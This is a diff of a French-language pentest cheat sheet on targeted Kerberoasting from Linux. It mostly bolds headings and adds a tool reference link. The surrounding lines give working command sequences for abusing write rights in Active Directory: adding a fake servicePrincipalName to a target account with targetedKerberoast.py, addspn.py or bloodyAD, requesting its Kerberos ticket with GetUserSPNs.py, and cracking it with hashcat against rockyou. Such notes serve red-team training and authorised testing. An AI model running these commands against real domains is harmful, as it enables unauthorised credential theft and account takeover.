@@ -19,16 +19,17 @@ Set-DomainObject -Identity <targetuser> -Set @{serviceprincipalname
 ```
 
 #### Linux 
-1. <span style="color:red;"><code>targetedKerberoast.py</code></span> **(le plus simple, tout-en-un)**
+**1. <span style="color:red;"><code>targetedKerberoast.py</code></span> (le plus simple, tout-en-un)**
 
 Il détecte automatiquement les comptes sur lesquels tu as les droits, ajoute le SPN, récupère le ticket, et le retire — en une seule commande :
+ref de l'outil : https://github.com/ShutdownRepo/targetedKerberoast
 
 ```bash
 targetedKerberoast.py -d <domain> -u <user> -p '<password>' -dc-ip <dc_ip>
 ```
 Ça sort direct le hash au format hashcat. Pratique pour un premier passage rapide.
 
-2. addspn.py (impacket) — pour contrôler manuellement l'ajout
+**2. addspn.py (impacket) — pour contrôler manuellement l'ajout**
 ```bash
 addspn.py -u '<domain>\<user>' -p '<password>' -t <target_user> -s 'fake/whatever01' <dc_ip>
 ```
@@ -43,23 +44,23 @@ GetUserSPNs.py <domain>/<user>:'<password>' -dc-ip <dc_ip> -request-user <target
 ```
 Ça te donne directement le hash Kerberos à cracker.
 
-3. bloodyAD (alternative moderne, bien maintenue)
+**3. bloodyAD (alternative moderne, bien maintenue)**
 ```bash
 bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' set object <target_user> servicePrincipalName -v 'fake/whatever01'
 ```
-Après l'ajout — récupérer le ticket
+**Après l'ajout — récupérer le ticket**
 
 Si tu n'as pas utilisé targetedKerberoast.py, une fois le SPN posé :
 
 ```bash
 GetUserSPNs.py <domain>/<user>:'<password>' -dc-ip <dc_ip> -outputfile hashes.txt
 ```
-Puis crack avec hashcat :
+**Puis crack avec hashcat :**
 
 ```bash
 hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
-Nettoyage (optionnel mais propre)
+**Nettoyage (optionnel mais propre)**
 
 Pour retirer le SPN après usage avec addspn.py :
 
